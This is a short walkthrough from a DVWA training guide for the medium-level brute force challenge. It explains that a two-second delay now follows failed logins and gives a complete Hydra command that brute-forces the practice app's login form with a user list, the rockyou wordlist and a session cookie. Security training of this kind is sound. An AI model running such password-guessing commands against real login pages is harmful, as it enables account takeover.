<b>Challenge URL:</b> /dvwa/vulnerabilities/brute/
<br>
<b>Objective:</b> Brute force the administrator's password.
<br>
<b>Bonus objective:</b> Find the other four users' usernames and brute force each password.
<br>
<b>Tools needed:</b> Hydra
<br><br>
<i>Did you remember to read this section's <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/README.md" target="_blank">README</a>?</i>

<h2><b>The Guide</b></h2>

<i>Since this challenge is very similar to the easy mode challenge, I'd highly recommend re-reading <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/Challenge%2001:%20Brute%20Force.mdd" target="_blank">our notes from before</a>. We'll be using a lot of the analysis and code from before.</i>

<h3><b>What's Changed</b></h3>

Let's start by clicking the "View Source" button on the bottom right of the challenge.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/brutesource.png" width="500">

It looks like the developer added a timeout for failed logins, causing the program to sleep for two seconds.

<h3><b>Crafting a New Exploit</b></h3>

Very little should change for this version of the challenge, including how we enumerate usernames. The only difference is the speed you'll discover each credential set. Let's run our old command, changing the cookie values as appropriate, and verify our assumption.

<code>hydra -L users.txt -P rockyou.txt -s 80 dvwa http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=medium; PHPSESSID=[your_value_here]"</code>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/brutesuccess.png" width="500">

Yep, the only thing that's changed is the time it took to finish. Challenge complete!
